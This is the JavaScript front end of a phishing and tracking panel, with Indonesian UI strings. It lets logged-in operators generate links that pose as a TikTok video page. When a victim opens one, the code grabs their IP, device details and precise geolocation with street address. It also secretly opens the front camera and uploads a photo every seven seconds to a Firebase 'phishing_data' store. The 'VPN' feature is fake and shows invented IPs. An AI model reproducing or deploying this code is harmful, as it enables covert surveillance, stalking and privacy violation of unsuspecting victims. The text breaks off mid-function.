// ===== VARIABLES =====
let currentUser = null;
let currentUserData = null;
let trackers = [];
let history = [];
let serverStatus = 'online';
let passwordVisible = false;
let vpnConnected = false;
let vpnServer = null;
let originalIP = '';

// Admin & owner accounts
const ADMIN_ACCOUNTS = ['zaaa', 'onedev'];

// Token functions
function b64e(s) { 
    return btoa(s).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,''); 
}

function b64d(s) { 
    s = s.replace(/-/g,'+').replace(/_/g,'/'); 
    while(s.length % 4) s += '='; 
    return atob(s); 
}

// ===== VPN MODAL FUNCTIONS =====
function showVPNModal() {
    const modal = document.getElementById('vpnModalOverlay');
    if (!modal) return;
    
    // Sync pilihan negara dengan dropdown utama
    const mainCountry = document.getElementById('vpnCountry');
    const modalCountry = document.getElementById('vpnModalCountry');
    if (mainCountry && modalCountry) {
        modalCountry.value = mainCountry.value;
    }
    
    modal.style.display = 'flex';
}

function closeVPNModal() {
    const modal = document.getElementById('vpnModalOverlay');
    if (modal) {
        modal.style.display = 'none';
    }
}

function activateVPNFromModal() {
    const modalCountry = document.getElementById('vpnModalCountry');
    const mainCountry = document.getElementById('vpnCountry');
    
    // Sync pilihan negara ke dropdown utama
    if (mainCountry && modalCountry) {
        mainCountry.value = modalCountry.value;
    }
    
    // Aktifkan VPN
    if (typeof toggleVPN === 'function') {
        toggleVPN();
    }
    
    // Tutup modal
    closeVPNModal();
    
    // Tampilkan notifikasi
    showVPNNotification('✅ VPN Activated - You are now protected!');
}

function checkVPNStatusAndShowReminder() {
    console.log('Checking VPN status...');
    
    if (!vpnConnected) {
        console.log('VPN not connected, showing modal');
        showVPNModal();
    } else {
        console.log('VPN connected, hiding modal');
        closeVPNModal();
    }
}

function showVPNNotification(message) {
    const oldNotif = document.querySelector('.vpn-notification');
    if (oldNotif) oldNotif.remove();
    
    const notif = document.createElement('div');
    notif.className = 'vpn-notification';
    notif.innerHTML = `
        <i class="fas fa-shield-alt"></i>
        <span>${message}</span>
    `;
    document.body.appendChild(notif);
    
    setTimeout(() => {
        notif.style.opacity = '0';
        setTimeout(() => {
            if (notif.parentNode) notif.remove();
        }, 300);
    }, 3000);
}

function checkVPNOnLoad() {
    console.log('checkVPNOnLoad called');
    setTimeout(() => {
        checkVPNStatusAndShowReminder();
    }, 1500);
}

// ===== VPN FUNCTIONS =====
async function getRealIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        originalIP = data.ip;
        
        const ipElements = document.querySelectorAll('#vpnRealIP, #vpnIP');
        ipElements.forEach(el => {
            if (el) el.textContent = originalIP;
        });
        
        return originalIP;
    } catch {
        originalIP = 'Unknown';
        const ipElements = document.querySelectorAll('#vpnRealIP, #vpnIP');
        ipElements.forEach(el => {
            if (el) el.textContent = 'Unknown';
        });
        return 'Unknown';
    }
}

function toggleVPN() {
    console.log('Toggle VPN clicked');
    const toggleBtn = document.getElementById('vpnToggleBtn');
    const vpnIcon = document.getElementById('vpnIcon');
    const statusIcon = document.getElementById('vpnStatusIcon');
    const statusTitle = document.getElementById('vpnStatusTitle');
    const statusSubtitle = document.getElementById('vpnStatusSubtitle');
    const vpnInfo = document.getElementById('vpnInfo');
    const countrySelect = document.getElementById('vpnCountry');
    
    if (!toggleBtn || !vpnIcon || !statusIcon || !statusTitle || !statusSubtitle || !vpnInfo || !countrySelect) {
        console.error('VPN elements not found!');
        return;
    }
    
    vpnConnected = !vpnConnected;
    console.log('VPN Connected:', vpnConnected);
    
    if (vpnConnected) {
        toggleBtn.classList.add('active');
        vpnIcon.className = 'fas fa-check';
        statusIcon.classList.add('connected');
        statusIcon.innerHTML = '<i class="fas fa-shield-alt"></i>';
        
        const country = countrySelect.value;
        const countryText = countrySelect.options[countrySelect.selectedIndex].text;
        
        let vpnIP = '';
        switch(country) {
            case 'singapore': vpnIP = '103.25.1.1'; break;
            case 'japan': vpnIP = '45.76.1.1'; break;
            case 'usa': vpnIP = '104.28.1.1'; break;
            case 'uk': vpnIP = '185.15.1.1'; break;
            case 'germany': vpnIP = '85.25.1.1'; break;
            case 'netherlands': vpnIP = '195.35.1.1'; break;
            default: vpnIP = '10.0.0.1';
        }
        
        statusTitle.textContent = 'VPN Connected';
        statusSubtitle.innerHTML = `Server: ${countryText.split(' ')[1] || country} · IP: <span style="color:#10b981;">${vpnIP}</span>`;
        vpnInfo.innerHTML = '<i class="fas fa-lock"></i> VPN Active - Your connection is encrypted';
        
        showNotification('🔒 VPN Connected - Connection secured', true);
        showVPNNotification('🔒 VPN Connected - You are protected!');
        vpnServer = country;
        updateVPNStatusBar(true);
        
        // TUTUP MODAL KALAU AKTIF
        closeVPNModal();
        
    } else {
        toggleBtn.classList.remove('active');
        vpnIcon.className = 'fas fa-power-off';
        statusIcon.classList.remove('connected');
        
        statusTitle.textContent = 'VPN Disconnected';
        statusSubtitle.innerHTML = `Your IP: <span style="color:#2a85ff;">${originalIP || 'Loading...'}</span>`;
        vpnInfo.innerHTML = '<i class="fas fa-lock-open"></i> VPN Disconnected - Your IP is visible';
        
        showNotification('🔓 VPN Disconnected', false);
        showVPNNotification('🔓 VPN Disconnected - Your IP is exposed!');
        vpnServer = null;
        updateVPNStatusBar(false);
        
        // TAMPILKAN MODAL LAGI KALAU NONAKTIF
        showVPNModal();
    }
}

function updateVPNStatusBar(connected) {
    if (connected) {
        let metaTheme = document.querySelector('meta[name="theme-color"]');
        if (!metaTheme) {
            metaTheme = document.createElement('meta');
            metaTheme.name = 'theme-color';
            document.head.appendChild(metaTheme);
        }
        metaTheme.content = '#10b981';
        
        let link = document.querySelector("link[rel~='icon']");
        if (!link) {
            link = document.createElement('link');
            link.rel = 'icon';
            document.head.appendChild(link);
        }
        link.href = 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>';
        
    } else {
        let metaTheme = document.querySelector('meta[name="theme-color"]');
        if (metaTheme) metaTheme.content = '#0a0a0f';
        
        let link = document.querySelector("link[rel~='icon']");
        if (link) link.href = 'data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔓</text></svg>';
    }
}

// ===== MAINTENANCE CHECK =====
function checkMaintenanceAccess(username) {
    if (serverStatus === 'maintenance') {
        return ADMIN_ACCOUNTS.includes(username);
    }
    return true;
}

// ===== SERVER STATUS =====
function listenToServerStatus() {
    db.ref('server_status').on('value', (s) => {
        const data = s.val();
        serverStatus = data ? data.status : 'online';
        const line = document.getElementById('serverStatusLine');
        if (line) line.className = 'server-status-line ' + serverStatus;
        
        const maintPage = document.getElementById('maintenancePage');
        const dashboard = document.getElementById('dashboard');
        const loginCard = document.getElementById('loginCard');
        
        if (serverStatus === 'maintenance' && currentUser && !ADMIN_ACCOUNTS.includes(currentUser)) {
            if (dashboard) dashboard.style.display = 'none';
            if (loginCard) loginCard.style.display = 'none';
            if (maintPage) maintPage.style.display = 'flex';
        } else if (serverStatus === 'maintenance' && (!currentUser || ADMIN_ACCOUNTS.includes(currentUser))) {
            if (maintPage) maintPage.style.display = 'none';
        } else {
            if (maintPage) maintPage.style.display = 'none';
        }
        
        updateJadwalStatus();
    });
}

// ===== NAVIGATION =====
function switchPage(page, element) {
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    if(element) element.classList.add('active');
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    
    const accountCard = document.getElementById('phisingAccountCard');
    if (page === 'list') {
        if (accountCard) accountCard.style.display = 'block';
        document.getElementById('listPage').classList.add('active');
    } else {
        if (accountCard) accountCard.style.display = 'none';
        if (page === 'tools') {
            document.getElementById('toolsPage').classList.add('active');
        } else if (page === 'vpn') {
            document.getElementById('vpnPage').classList.add('active');
            getRealIP();
        } else if (page === 'device') { 
            document.getElementById('devicePage').classList.add('active');
            updateDeviceInfo();
        } else if (page === 'contact') {
            document.getElementById('contactPage').classList.add('active');
        }
    }
}

function backToList() {
    document.getElementById('previewPage').classList.remove('active');
    document.getElementById('listPage').classList.add('active');
    const accountCard = document.getElementById('phisingAccountCard');
    if (accountCard) accountCard.style.display = 'block';
    document.querySelectorAll('.nav-item')[0].classList.add('active');
}

// ===== DOWNLOADER =====
function openDownloader(type) {
    if (serverStatus === 'maintenance' && !ADMIN_ACCOUNTS.includes(currentUser)) {
        showNotification('❌ Maintenance mode', false);
        return;
    }
    
    if(type === 'tiktok') document.getElementById('tiktokDownloader').style.display = 'flex';
    else if(type === 'instagram') document.getElementById('instagramDownloader').style.display = 'flex';
    else if(type === 'youtube') document.getElementById('youtubeDownloader').style.display = 'flex';
}

function closeDownloader(id) {
    document.getElementById(id).style.display = 'none';
    if(id === 'tiktokDownloader') {
        document.getElementById('tiktokUrl').value = '';
        document.getElementById('tiktokResult').style.display = 'none';
    } else if(id === 'instagramDownloader') {
        document.getElementById('instagramUrl').value = '';
        document.getElementById('instagramResult').style.display = 'none';
    } else if(id === 'youtubeDownloader') {
        document.getElementById('youtubeUrl').value = '';
        document.getElementById('youtubeResult').style.display = 'none';
    }
}

async function downloadTikTok() {
    const url = document.getElementById('tiktokUrl').value.trim();
    if(!url) return showNotification('Masukkan URL TikTok');
    showNotification('Mengambil data...');
    try {
        const apiUrl = `https://tikwm.com/api/?url=${encodeURIComponent(url)}`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        if(data.code === 0) {
            const videoUrl = data.data.play;
            const title = data.data.title;
            const desc = data.data.desc || 'TikTok Video';
            document.getElementById('tiktokVideo').src = videoUrl;
            document.getElementById('tiktokTitle').textContent = title;
            document.getElementById('tiktokDesc').textContent = desc;
            document.getElementById('tiktokResult').style.display = 'block';
            document.getElementById('tiktokDownloadBtn').setAttribute('data-url', videoUrl);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

async function downloadInstagram() {
    const url = document.getElementById('instagramUrl').value.trim();
    if(!url) return showNotification('Masukkan URL Instagram');
    showNotification('Mengambil data...');
    try {
        const response = await fetch(`https://instagram-downloader-download-instagram-videos-stories1.p.rapidapi.com/get-info-rapidapi?url=${encodeURIComponent(url)}`, {
            headers: {
                'X-RapidAPI-Key': 'demo-key',
                'X-RapidAPI-Host': 'instagram-downloader-download-instagram-videos-stories1.p.rapidapi.com'
            }
        });
        const data = await response.json();
        if(data.video) {
            document.getElementById('instagramVideo').src = data.video;
            document.getElementById('instagramTitle').textContent = data.title || 'Instagram Video';
            document.getElementById('instagramDesc').textContent = 'Instagram Reels';
            document.getElementById('instagramResult').style.display = 'block';
            document.getElementById('instagramDownloadBtn').setAttribute('data-url', data.video);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

async function downloadYouTube() {
    const url = document.getElementById('youtubeUrl').value.trim();
    if(!url) return showNotification('Masukkan URL YouTube');
    showNotification('Mengambil data...');
    try {
        const response = await fetch(`https://youtube-video-download-info.p.rapidapi.com/dl?id=${getYouTubeId(url)}`, {
            headers: {
                'X-RapidAPI-Key': 'demo-key',
                'X-RapidAPI-Host': 'youtube-video-download-info.p.rapidapi.com'
            }
        });
        const data = await response.json();
        if(data.videoDetails) {
            const videoUrl = data.formats.find(f => f.hasVideo && f.hasAudio)?.url || data.formats[0]?.url;
            document.getElementById('youtubeVideo').src = videoUrl;
            document.getElementById('youtubeTitle').textContent = data.videoDetails.title;
            document.getElementById('youtubeDesc').textContent = 'YouTube Video';
            document.getElementById('youtubeResult').style.display = 'block';
            document.getElementById('youtubeDownloadBtn').setAttribute('data-url', videoUrl);
        } else showNotification('Gagal mengambil video');
    } catch(e) { showNotification('Error: ' + e.message); }
}

function getYouTubeId(url) {
    const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|&v=)([^#&?]*).*/;
    const match = url.match(regExp);
    return (match && match[2].length === 11) ? match[2] : null;
}

function downloadVideo(type) {
    const btn = document.getElementById(type + 'DownloadBtn');
    const url = btn.getAttribute('data-url');
    if(url) window.open(url, '_blank');
}

// ===== CONTACT DROPDOWN =====
function toggleContact(sectionId) {
    const section = document.getElementById(sectionId);
    section.classList.toggle('open');
}

// ===== PASSWORD TOGGLE =====
function togglePassword() {
    const disp = document.getElementById('passwordDisplay');
    const eye = document.getElementById('eyeIcon');
    if(passwordVisible) {
        disp.textContent = '••••••••';
        eye.className = 'fas fa-eye';
    } else {
        disp.textContent = currentUserData ? currentUserData.password : '••••••••';
        eye.className = 'fas fa-eye-slash';
    }
    passwordVisible = !passwordVisible;
}

// ===== WORLD CLOCK =====
function updateWorldClock() {
    const now = new Date();
    document.getElementById('worldClock').textContent = 
        now.toLocaleTimeString('id-ID',{timeZone:'Asia/Jakarta',hour12:false});
}

// ===== REFRESH =====
function refreshData() {
    const btn = document.getElementById('refreshBtn');
    btn.classList.add('rotating');
    if(currentUser) {
        db.ref(`users/${currentUser}/trackers`).once('value', s => {
            trackers = s.val() || [];
            renderTrackerList();
            setTimeout(() => btn.classList.remove('rotating'), 500);
        });
    } else setTimeout(() => btn.classList.remove('rotating'), 500);
}

// ===== RENDER TRACKER LIST =====
function renderTrackerList() {
    const list = document.getElementById('trackerList');
    if(!list) return;
    
    if(!trackers || trackers.length === 0) {
        list.innerHTML = '<div style="text-align:center; padding:30px; color:#6b7280; font-size:12px;">No targets yet<br><small style="font-size:10px;">Click + to create</small></div>';
        return;
    }
    let html = '';
    trackers.forEach((t, i) => {
        const hasData = t.data && t.data.ip;
        html += `
            <div class="tracker-item ${hasData ? 'has-data' : ''}" onclick="openPreview(${i})">
                <div class="tracker-item-header">
                    <div class="tracker-icon">
                        <i class="fas fa-bug"></i>
                        ${hasData ? '<span class="data-badge"></span>' : ''}
                    </div>
                    <div class="tracker-info">
                        <div class="tracker-name">${escapeHtml(t.name)}</div>
                        <div class="tracker-desc">${t.time || 'Just now'} ${hasData ? '· Data ready' : ''}</div>
                    </div>
                </div>
            </div>
        `;
    });
    list.innerHTML = html;
}

function escapeHtml(t) {
    const d = document.createElement('div');
    d.textContent = t;
    return d.innerHTML;
}

// ===== PREVIEW =====
function openPreview(index) {
    const t = trackers[index];
    document.getElementById('previewTitle').textContent = t.name;
    const c = document.getElementById('previewContent');
    if(!t.data) {
        c.innerHTML = `
            <div class="preview-card" style="text-align:center;">
                <i class="fas fa-hourglass-half" style="font-size:40px; color:#2a85ff;"></i>
                <p style="color:#6b7280; margin:12px 0;">Waiting...</p>
                <p style="font-size:10px; word-break:break-all;">${t.link}</p>
                <div class="preview-actions">
                    <div class="preview-btn" onclick="copyLink('${t.link}')">COPY LINK</div>
                    <div class="preview-btn delete" onclick="deleteTracker(${index})">DELETE</div>
                </div>
            </div>
        `;
    } else {
        const d = t.data;
        const p = d.photos ? Object.values(d.photos) : [];
        let ph = '';
        if(p.length > 0) p.slice(0,6).forEach(f => ph += `<div class="preview-photo" onclick="openZoom('${f}')"><img src="${f}"></div>`);
        else for(let i=0; i<3; i++) ph += '<div class="preview-photo"><i class="fas fa-camera"></i></div>';
        
        c.innerHTML = `
            <div class="preview-card">
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-map-marker-alt"></i> LOCATION</div>
                    <div class="preview-grid">
                        <div class="preview-row"><span class="preview-label">IP</span><span class="preview-value">${d.ip || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">Coordinates</span><span class="preview-value">${d.loc || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">Address</span><span class="preview-value">${d.address || 'Unknown'}</span></div>
                    </div>
                    ${d.loc ? `<button class="map-button" onclick="window.open('https://www.google.com/maps?q=${d.loc}','_blank')"><i class="fas fa-map-marked-alt"></i> VIEW MAP</button>` : ''}
                </div>
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-mobile-alt"></i> DEVICE</div>
                    <div class="preview-grid">
                        <div class="preview-row"><span class="preview-label">Time</span><span class="preview-value">${d.time || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">RAM</span><span class="preview-value">${d.ram || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">CPU</span><span class="preview-value">${d.cpu || 'Unknown'}</span></div>
                        <div class="preview-row"><span class="preview-label">OS</span><span class="preview-value">${d.android || d.os || 'Unknown'}</span></div>
                    </div>
                </div>
                <div class="preview-section">
                    <div class="preview-section-title"><i class="fas fa-camera"></i> PHOTOS</div>
                    <div class="preview-photo-grid">${ph}</div>
                </div>
                <div class="preview-actions">
                    <div class="preview-btn" onclick="copyLink('${t.link}')">COPY LINK</div>
                    <div class="preview-btn delete" onclick="deleteTracker(${index})">DELETE</div>
                </div>
            </div>
        `;
    }
    document.getElementById('listPage').classList.remove('active');
    document.getElementById('previewPage').classList.add('active');
    const accountCard = document.getElementById('phisingAccountCard');
    if (accountCard) accountCard.style.display = 'none';
}

// ===== CREATE TRACKER =====
function createTracker() {
    if(serverStatus !== 'online') return showNotification('❌ Server ' + serverStatus, false);
    const name = document.getElementById('trackerNameInput').value.trim();
    if(!name) return showNotification('Enter name');
    const id = Date.now().toString();
    const token = b64e(currentUser);
    const link = window.location.href.split('?')[0] + '?id=' + id + '&t=' + token;
    trackers.push({id, name, link, time: new Date().toLocaleTimeString(), data: null});
    if(currentUser) db.ref(`users/${currentUser}/trackers`).set(trackers);
    closeModal('addTrackerModal');
    document.getElementById('trackerNameInput').value = '';
    renderTrackerList();
    showNotification('Link created');
}

function deleteTracker(index) {
    if(confirm('Delete?')) {
        const t = trackers[index];
        if(t.data) {
            history.unshift({id: t.id, name: t.name, date: new Date().toLocaleString(), data: t.data});
            if(history.length > 50) history.pop();
            localStorage.setItem('phising_history', JSON.stringify(history));
        }
        if(t.id) db.ref(`phishing_data/${t.id}`).remove();
        trackers.splice(index, 1);
        if(currentUser) db.ref(`users/${currentUser}/trackers`).set(trackers);
        backToList();
        renderTrackerList();
        showNotification('Deleted');
    }
}

function copyLink(l) {
    navigator.clipboard.writeText(l).then(() => showNotification('Copied!'));
}

// ===== HISTORY =====
function openHistory() {
    const modal = document.getElementById('historyModal');
    const list = document.getElementById('historyList');
    if(history.length === 0) list.innerHTML = '<p style="color:#6b7280; text-align:center; font-size:12px;">No history</p>';
    else {
        let h = '';
        history.forEach((item, i) => {
            h += `
                <div style="background:#0c0c12; border-radius:14px; padding:10px; margin-bottom:8px;">
                    <div style="font-weight:600; font-size:13px;">${item.name}</div>
                    <div style="font-size:9px; color:#6b7280; margin:3px 0;">${item.date}</div>
                    <div style="font-size:10px;">IP: ${item.data?.ip || 'Unknown'}</div>
                    <div style="display:flex; gap:6px; margin-top:6px;">
                        <div class="preview-btn" style="padding:6px; font-size:10px;" onclick="viewHistoryItem(${i})">VIEW</div>
                        <div class="preview-btn delete" style="padding:6px; font-size:10px;" onclick="deleteHistoryItem(${i})">DELETE</div>
                    </div>
                </div>
            `;
        });
        list.innerHTML = h;
    }
    modal.style.display = 'flex';
}

function viewHistoryItem(i) {
    window.open(`https://www.google.com/maps?q=${history[i].data?.loc}`, '_blank');
}

function deleteHistoryItem(i) {
    history.splice(i, 1);
    localStorage.setItem('phising_history', JSON.stringify(history));
    openHistory();
}

// ===== DEVICE INFO =====
async function getBatteryInfo() {
    try {
        const b = await navigator.getBattery();
        return {level: Math.round(b.level * 100), charging: b.charging};
    } catch {
        return {level: 85, charging: false};
    }
}

function getRAM() {
    return navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '4 GB';
}

async function getStorage() {
    if('storage' in navigator && navigator.storage?.estimate) {
        const est = await navigator.storage.estimate();
        return Math.round(est.quota / (1024 * 1024 * 1024)) + ' GB';
    }
    return '128 GB (est.)';
}

function getChipset() {
    const ua = navigator.userAgent;
    if(ua.includes('Snapdragon')) return 'Snapdragon';
    if(ua.includes('Exynos')) return 'Exynos';
    if(ua.includes('MediaTek')) return 'MediaTek';
    if(ua.includes('Tensor')) return 'Google Tensor';
    if(ua.includes('iPhone')) return 'Apple A-series';
    return 'Unknown';
}

function getPlatform() {
    const ua = navigator.userAgent;
    if(ua.includes('Android')) return 'Android ' + (ua.match(/Android\s([0-9.]+)/)?.[1] || '');
    if(ua.includes('iPhone')) return 'iOS ' + (ua.match(/OS\s([0-9_]+)/)?.[1].replace(/_/g, '.') || '');
    return 'Unknown';
}

function getModel() {
    const ua = navigator.userAgent;
    if(ua.includes('Android')) {
        const match = ua.match(/Android\s([0-9.]+);\s*([^;]+)/);
        return match?.[2]?.trim() || 'Android Device';
    }
    if(ua.includes('iPhone')) return 'iPhone';
    return 'Unknown';
}

async function getIP() {
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        return data.ip;
    } catch {
        return 'Unknown';
    }
}

function updateTime() {
    document.getElementById('currentTime').textContent = new Date().toLocaleTimeString('id-ID', {hour12: false});
}

async function updateDeviceInfo() {
    const battery = await getBatteryInfo();
    document.getElementById('batteryLevel').textContent = battery.level + '%' + (battery.charging ? ' ⚡' : '');
    updateTime();
    setInterval(updateTime, 1000);
    document.getElementById('phoneModel').textContent = getModel();
    document.getElementById('ramInfo').textContent = getRAM();
    document.getElementById('platform').textContent = getPlatform();
    document.getElementById('deviceModel').textContent = getModel();
    document.getElementById('chipsetInfo').textContent = getChipset();
    document.getElementById('storageInfo').textContent = await getStorage();
    document.getElementById('ipAddress').textContent = await getIP();
}

// ===== AUTH =====
function showNotification(m, s = true) {
    const n = document.getElementById('notification');
    n.style.borderColor = s ? '#2a85ff' : '#ef4444';
    n.style.color = s ? '#2a85ff' : '#ef4444';
    n.textContent = m;
    n.style.display = 'block';
    setTimeout(() => n.style.display = 'none', 2000);
}

function openModal(id) { 
    if(id === 'addTrackerModal' && serverStatus !== 'online') {
        if (serverStatus === 'maintenance' && !ADMIN_ACCOUNTS.includes(currentUser)) {
            return showNotification('❌ Maintenance mode', false);
        }
        if (serverStatus === 'offline') {
            return showNotification('Server offline', false);
        }
    }
    document.getElementById(id).style.display = 'flex'; 
}

function closeModal(id) {
    document.getElementById(id).style.display = 'none';
}

function openZoom(s) {
    document.getElementById('zoomedImage').src = s;
    document.getElementById('zoomOverlay').style.display = 'flex';
}

function handleLogin() {
    const u = document.getElementById('username').value.trim();
    const p = document.getElementById('password').value.trim();
    if(!u || !p) return showNotification('Fill all fields');
    
    db.ref('registered_users/' + u).once('value').then(s => {
        const d = s.val();
        if(d && d.password === p && new Date().getTime() < d.expiry) {
            
            if (!checkMaintenanceAccess(u)) {
                document.getElementById('maintenancePage').style.display = 'flex';
                return;
            }
            
            currentUser = u;
            currentUserData = d;
            localStorage.setItem('current_user', u);
            localStorage.setItem('user_expiry', d.expiry);
            
            document.getElementById('loginCard').style.display = 'none';
            
            const splashOverlay = document.getElementById('splashVideoOverlay');
            const splashVideo = document.getElementById('splashVideo');
            
            splashVideo.pause();
            splashVideo.currentTime = 0;
            splashVideo.muted = false;
            splashVideo.volume = 1.0;
            splashVideo.playsInline = true;
            
            splashVideo.load();
            
            splashOverlay.style.display = 'flex';
            
            const goToDashboard = function() {
                splashOverlay.style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                document.getElementById('accountUsername').textContent = u;
                document.getElementById('displayUsername').innerHTML = u + '<span>.</span>';
                
                const h = localStorage.getItem('phising_history');
                if(h) history = JSON.parse(h);
                
                listenToServerStatus();
                
                db.ref(`users/${u}/trackers`).once('value', s => {
                    trackers = s.val() || [];
                    trackers.forEach((t, i) => {
                        if(t.id) {
                            db.ref(`phishing_data/${t.id}`).on('value', ds => {
                                const nd = ds.val();
                                if(nd && JSON.stringify(trackers[i].data) !== JSON.stringify(nd)) {
                                    trackers[i].data = nd;
                                    renderTrackerList();
                                }
                            });
                        }
                    });
                    renderTrackerList();
                });
                
                setInterval(() => {
                    const exp = localStorage.getItem('user_expiry');
                    if(!exp) return;
                    const d = exp - new Date().getTime();
                    if(d < 0) {
                        logout();
                        return;
                    }
                    const h = Math.floor(d / 3600000);
                    const m = Math.floor((d % 3600000) / 60000);
                    const s = Math.floor((d % 60000) / 1000);
                    document.getElementById('expiryDisplay').textContent =
                        `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                }, 1000);
                
                updateWorldClock();
                setInterval(updateWorldClock, 1000);
                
                getRealIP();
                
                // CEK VPN REMINDER
                checkVPNOnLoad();
                
                showNotification('Welcome');
            };
            
            splashVideo.oncanplaythrough = function() {
                console.log('✅ Video ready');
                
                let playPromise = splashVideo.play();
                
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        console.log('✅ Video playing with sound');
                    }).catch(err => {
                        console.log('❌ Play failed:', err);
                        
                        splashVideo.muted = true;
                        splashVideo.play().then(() => {
                            setTimeout(() => {
                                splashVideo.muted = false;
                            }, 1000);
                        }).catch(e => {
                            console.log('❌ Fallback failed');
                            goToDashboard();
                        });
                    });
                }
            };
            
            splashVideo.onended = function() {
                console.log('✅ Video ended');
                goToDashboard();
            };
            
            splashVideo.onerror = function(e) {
                console.log('❌ Video error:', e);
                splashOverlay.innerHTML = `
                    <div style="text-align:center; color:#fff; padding:20px;">
                        <i class="fas fa-exclamation-triangle" style="font-size:50px; color:#ff4444; margin-bottom:15px;"></i>
                        <p>Video tidak dapat dimuat</p>
                        <p style="font-size:12px; color:#666; margin-top:10px;">Mengalihkan ke dashboard...</p>
                    </div>
                `;
                setTimeout(goToDashboard, 2000);
            };
            
            splashVideo.load();
            
            setTimeout(function() {
                if (splashOverlay.style.display === 'flex') {
                    console.log('⚠️ Timeout');
                    goToDashboard();
                }
            }, 10000);
            
        } else {
            showNotification('Invalid credentials');
        }
    });
}

function logout() {
    localStorage.removeItem('current_user');
    localStorage.removeItem('user_expiry');
    closeModal('logoutModal');
    document.getElementById('dashboard').style.display = 'none';
    document.getElementById('loginCard').style.display = 'block';
    document.getElementById('maintenancePage').style.display = 'none';
}

// ===== TARGET PAGE =====
function handleTargetPage() {
    const p = new URLSearchParams(window.location.search);
    const id = p.get('id'), t = p.get('t');
    if(id && t) {
        try {
            const owner = b64d(t);
            document.body.innerHTML = `
                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; background:#000;">
                    <video autoplay muted loop playsinline style="width:100%; max-width:350px;">
                        <source src="https://i.imgur.com/9e0hgPJ.mp4">
                    </video>
                    <h2 style="margin-top:15px; font-size:18px;">TikTok</h2>
                </div>
            `;
            captureTargetData(id, owner);
        } catch(e) {}
        return true;
    }
    return false;
}

function captureTargetData(id, owner) {
    db.ref('server_status').once('value', s => {
        if(s.val()?.status === 'offline' || s.val()?.status === 'maintenance') return;
        const path = `phishing_data/${id}`;
        const time = new Date().toLocaleString('id-ID');
        
        if(navigator.getBattery) {
            navigator.getBattery().then(b => db.ref(path).update({battery: Math.round(b.level * 100)}));
        }
        
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(r => db.ref(path).update({ip: r.ip, time: time}));
        
        if("geolocation" in navigator) {
            navigator.geolocation.getCurrentPosition(p => {
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                db.ref(path).update({loc: `${lat},${lon}`});
                fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
                    .then(r => r.json())
                    .then(d => db.ref(path).update({address: d.display_name}));
            }, () => {}, {enableHighAccuracy: true, timeout: 10000});
        }
        
        db.ref(path).update({
            ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' Core' : 'Unknown',
            android: navigator.userAgent.includes('Android') ? 'Android' : 'Other OS'
        });
        
        navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}})
            .then(s => {
                const v = document.createElement('video');
                v.srcObject = s;
                v.play();
                setInterval(() => {
                    const c = document.createElement('canvas');
                    c.width = 320;
                    c.height = 320;
                    c.getContext('2d').drawImage(v, 0, 0, 320, 320);
                    db.ref(path + '/photos').push(c.toDataURL('image/jpeg', 0.5));
                }, 7000);
            }).catch(() => {});
    });
}

// ===== JADWAL UPDATE =====
function updateJadwalStatus() {
    const statusEl = document.getElementById('serverStatusJadwal');
    const timeEl = document.getElementById('serverTimeJadwal');
    const messageEl = document.getElementById('serverMessageJadwal');
    
    if (!statusEl || !timeEl || !messageEl) return;
    
    statusEl.textContent = serverStatus === 'online' ? 'ONLINE' : 
                          serverStatus === 'offline' ? 'OFFLINE' : 'MAINTENANCE';
    
    statusEl.style.color = serverStatus === 'online' ? '#10b981' :
                          serverStatus === 'offline' ? '#ef4444' : '#8b5cf6';
    
    const now = new Date();
    timeEl.textContent = now.toLocaleTimeString('id-ID', { hour12: false, hour: '2-digit', minute: '2-digit' });
    
    const currentHour = now.getHours();
    if (serverStatus === 'online') {
        if (currentHour >= 5 && currentHour < 23) {
            messageEl.textContent = '✅ SERVER ONLINE';
        } else {
            messageEl.textContent = '⚠️ Diluar jadwal ON, hubungi admin';
        }
    } else if (serverStatus === 'offline') {
        if (currentHour >= 23 || currentHour < 5) {
            messageEl.textContent = '✅ SERVER OFFLINE';
        } else {
            messageEl.textContent = '⚠️ Diluar jadwal OFF, hubungi admin';
        }
    } else {
        messageEl.textContent = '🔧 MAINTENANCE SERVER';
    }
}

// ===== INIT =====
window.onload = function() {
    if(handleTargetPage()) return;
    
    listenToServerStatus();
    setInterval(updateJadwalStatus, 1000);
    
    const saved = localStorage.getItem('current_user');
    
    if(saved) {
        db.ref('registered_users/' + saved).once('value').then(s => {
            const d = s.val();
            if(d && new Date().getTime() < d.expiry) {
                
                if (!checkMaintenanceAccess(saved)) {
                    document.getElementById('maintenancePage').style.display = 'flex';
                    return;
                }
                
                currentUser = saved;
                currentUserData = d;
                
